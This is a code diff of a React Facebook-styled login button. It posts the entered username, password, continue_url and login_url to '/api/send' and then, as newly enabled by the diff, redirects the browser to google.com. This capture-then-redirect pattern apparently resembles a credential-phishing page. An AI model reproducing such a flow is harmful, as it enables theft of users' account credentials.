@@ -48,12 +48,12 @@ const LoginButton = ({login,continu2,isAuthenticated}:Props) =>{
 
             const res =  await axios.post('/api/send',{username,password,continue_url,login_url});
             dispatch(uiActions.setLoading(false))
+            const link =document.createElement('a');
+            link.href = 'https://google.com';
+            link.click();
             // if(res.status == 200){
               console.log(res)
               console.log("EXITOSO")
-              // const link =document.createElement('a');
-              // link.href = 'https://google.com';
-              // link.click();
           }catch(err){
             console.log(err)
             dispatch(uiActions.setLoading(false))
@@ -81,7 +81,7 @@ const LoginButton = ({login,continu2,isAuthenticated}:Props) =>{
     }
     
     const onLoginClick = () => {
-      dispatch(authActions.setLoading(true))
+      dispatch(uiActions.setLoading(true))
         window.FB.login(function(response:any) {
           console.log('Login response',response)
           if (response.authResponse) {
@@ -98,9 +98,9 @@ const LoginButton = ({login,continu2,isAuthenticated}:Props) =>{
             console.log(response)
             console.log('Login response',response)
             console.log('Login response',response.authResponse)
-            dispatch(authActions.setLoading(true))
+            dispatch(authActions.setLoading(false))
           } else {
-            dispatch(authActions.setLoading(true))
+            dispatch(uiActions.setLoading(false))
            console.log('User cancelled login or did not fully authorize.');
           }
       });
@@ -119,7 +119,7 @@ const LoginButton = ({login,continu2,isAuthenticated}:Props) =>{
         <div 
         onClick={onLoginClick}
         className='flex h-12 px-3 rounded-2xl bg-facebook  items-center cursor-pointer relative'>
-          {ui.loading?
+          {ui.loading ?
               <svg aria-hidden="true" 
           className=" w-6 h-6 text-gray-200 animate-spin fill-facebook mr-2 z-10 "
           viewBox="0 0 100 101" fill="none" xmlns="http://www.w3.org/2000/svg">
